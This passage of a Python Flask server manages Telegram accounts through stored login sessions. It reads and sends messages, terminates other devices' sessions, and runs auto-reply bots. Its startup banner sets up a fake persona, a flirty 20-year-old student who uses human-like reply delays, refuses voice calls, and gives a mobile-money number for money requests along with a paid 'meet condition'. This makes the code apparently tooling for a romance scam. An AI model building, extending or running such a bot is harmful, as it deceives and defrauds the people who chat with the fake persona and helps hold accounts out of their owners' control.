            return jsonify({'success': False, 'error': 'Phone number required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Adding account for phone: {phone}")
        
        async def send_code():
            client = TelegramClient(
                StringSession(), 
                API_ID, 
                API_HASH,
                connection_retries=3,
                retry_delay=1,
                timeout=15
            )
            try:
                await client.connect()
                logger.info(f"Connected to Telegram for {phone}")
                
                result = await client.send_code_request(phone)
                logger.info(f"Code sent successfully to {phone}")
                
                session_id = str(int(time.time()))
                temp_sessions[session_id] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                return {'success': True, 'session_id': session_id}
                
            except errors.FloodWaitError as e:
                logger.warning(f"Flood wait for {phone}: {e.seconds}s")
                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except errors.PhoneNumberBannedError:
                return {'success': False, 'error': 'This phone number is banned'}
            except (OSError, ConnectionError, TimeoutError) as e:
                logger.error(f"Network error for {phone}: {e}")
                return {'success': False, 'error': 'Network error. Cannot reach Telegram servers.'}
            except Exception as e:
                logger.error(f"Unexpected error for {phone}: {e}")
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(send_code())
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in add_account: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            new_id = 1
            if accounts:
                new_id = max([a['id'] for a in accounts]) + 1
            
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'session': client.session.save()
            }
            
            accounts.append(new_account)
            save_accounts()
            
            return {'success': True}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except errors.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            dialogs = await client.get_dialogs()
            
            chats = []
            for dialog in dialogs:
                if not dialog:
                    continue
                
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': '',
                    'lastMessageDate': 0
                }
                
                if dialog.message:
                    if dialog.message.text:
                        chat['lastMessage'] = dialog.message.text[:50]
                    elif dialog.message.media:
                        chat['lastMessage'] = '📎 Media'
                    
                    if dialog.message.date:
                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
                
                chats.append(chat)
            
            return {'success': True, 'chats': chats}
            
        except AuthKeyUnregisteredError:
            remove_invalid_account(account_id)
            return {'success': False, 'error': 'auth_key_unregistered'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                try:
                    entity = await client.get_entity(chat_id)
                except:
                    return {'success': False, 'error': 'Chat not found'}
            
            await client.send_message(entity, message)
            return {'success': True}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    
    stop_auto_reply_for_account(account_id)
    
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    
    if len(accounts) < original_len:
        save_accounts()
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Account not found'})

@app.route('/api/reply-settings', methods=['GET'])
def get_reply_settings():
    account_id = request.args.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    settings = reply_settings.get(account_key, {
        'enabled': False,
        'chats': {}
    })
    
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/reply-settings', methods=['POST'])
def update_reply_settings():
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', False)
    chat_settings = data.get('chats', {})
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {}
    
    was_enabled = reply_settings[account_key].get('enabled', False)
    reply_settings[account_key]['enabled'] = enabled
    reply_settings[account_key]['chats'] = chat_settings
    
    save_reply_settings()
    
    # Start or stop based on new setting
    if enabled and not was_enabled:
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if account and account_key not in active_clients:
            thread = threading.Thread(
                target=lambda: run_async(start_auto_reply_for_account(account)),
                daemon=True
            )
            thread.start()
            client_tasks[account_key] = thread
            logger.info(f"Started auto-reply for account {account_id}")
    elif not enabled and was_enabled:
        stop_auto_reply_for_account(account_id)
    
    return jsonify({'success': True, 'message': 'Settings updated'})

@app.route('/api/toggle-chat-reply', methods=['POST'])
def toggle_chat_reply():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    enabled = data.get('enabled', True)
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {'enabled': False, 'chats': {}}
    
    if 'chats' not in reply_settings[account_key]:
        reply_settings[account_key]['chats'] = {}
    
    reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
    
    save_reply_settings()
    
    return jsonify({'success': True, 'message': f'Auto-reply for chat {"enabled" if enabled else "disabled"}'})

@app.route('/api/conversation-history', methods=['GET'])
def get_conversation_history():
    account_id = request.args.get('accountId')
    chat_id = request.args.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    chat_key = str(chat_id)
    
    history = []
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        history = conversation_history[account_key][chat_key]
    
    return jsonify({'success': True, 'history': history})

@app.route('/api/clear-history', methods=['POST'])
def clear_conversation_history():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    chat_key = str(chat_id)
    
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        conversation_history[account_key][chat_key] = []
        save_conversation_history()
    
    return jsonify({'success': True, 'message': 'History cleared'})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def get_sessions():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            
            sessions = []
            current_hash = None
            
            for auth in result.authorizations:
                session_info = {
                    'hash': auth.hash,
                    'device_model': auth.device_model,
                    'platform': auth.platform,
                    'system_version': auth.system_version,
                    'api_id': auth.api_id,
                    'app_name': auth.app_name,
                    'app_version': auth.app_version,
                    'date_created': auth.date_created,
                    'date_active': auth.date_active,
                    'ip': auth.ip,
                    'country': auth.country,
                    'region': auth.region,
                    'current': auth.current
                }
                
                if auth.current:
                    current_hash = auth.hash
                
                sessions.append(session_info)
            
            return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
            
        except FreshResetAuthorisationForbiddenError:
            return {'success': False, 'error': 'fresh_reset_forbidden'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(get_sessions())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    data = request.json
    account_id = data.get('accountId')
    session_hash = data.get('hash')
    
    if not account_id or not session_hash:
        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            
            current_hash = None
            for auth in result.authorizations:
                if auth.current:
                    current_hash = auth.hash
                    break
            
            count = 0
            for auth in result.authorizations:
                if auth.hash != current_hash:
                    try:
                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
                        count += 1
                    except:
                        continue
            
            return {'success': True, 'message': f'Terminated {count} sessions'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/reconnect', methods=['GET'])
def reconnect_all():
    """Force reconnect all accounts"""
    for account_key in list(active_clients.keys()):
        stop_auto_reply_for_account(int(account_key))
    
    time.sleep(2)
    start_all_auto_replies()
    
    return jsonify({
        'success': True,
        'message': 'Reconnecting all accounts',
        'active': len(active_clients)
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'auto_reply_active': len(active_clients),
        'active_accounts': list(active_clients.keys()),
        'time': datetime.now().isoformat()
    })

# ==================== STARTUP ====================

def start_auto_reply_thread():
    """Start auto-reply in background after server starts"""
    time.sleep(5)
    logger.info("Starting auto-reply for enabled accounts...")
    start_all_auto_replies()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*70)
    print('🤖 TSEGA - SEXY TELEGRAM AUTO-REPLY')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    
    for acc in accounts:
        status = "ENABLED" if str(acc['id']) in reply_settings and reply_settings[str(acc['id'])].get('enabled') else "DISABLED"
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status}')
    
    print('='*70)
    print('🚀 TSEGA FEATURES:')
    print('   • Talks in Amharic with English translation')
    print('   • Sexy and flirty personality 😘')
    print('   • 15-40 second reply delay (human-like)')
    print('   • Telebirr: 0940980555 for money requests')
    print('   • Meet condition: 1000 birr with screenshot')
    print('   • Lives in Jemo, from Adama')
    print('   • Grade 12 student, 20 years old')
    print('   • Refuses voice calls, prefers meeting')
    print('='*70 + '\n')
    
    # Start keep-alive
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Start auto-reply
    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
    
    app.run(host='0.0.0.0', port=port, debug=False)
